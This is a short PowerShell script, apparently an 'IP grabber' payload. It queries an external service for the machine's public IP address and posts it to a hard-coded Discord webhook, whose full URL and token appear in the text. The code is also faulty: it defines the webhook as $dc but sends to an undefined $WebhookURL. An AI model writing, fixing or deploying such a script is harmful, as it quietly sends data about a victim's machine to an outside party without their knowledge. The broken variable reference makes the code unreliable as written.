
# Function to retrieve the machine's IP address
function Get-IPAddress {
    $IPAddress = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
    return $IPAddress
}

# Discord webhook URL
$dc = "https://discord.com/api/webhooks/1116817887349440522/3jS6qCFEZBVZwSvkMaoh5gHdn76_M0AQyhHqx5FlRHFyjEpLQ0hCvhN7jDB5R1f7IYfA"

# Retrieve the IP address
$IPAddress = Get-IPAddress

# Create a JSON payload with the IP address
$Payload = @{
    "content" = "Machine IP Address: $IPAddress"
} | ConvertTo-Json

# Send the payload to the Discord webhook
Invoke-RestMethod -Uri $WebhookURL -Method POST -ContentType "application/json" -Body $Payload
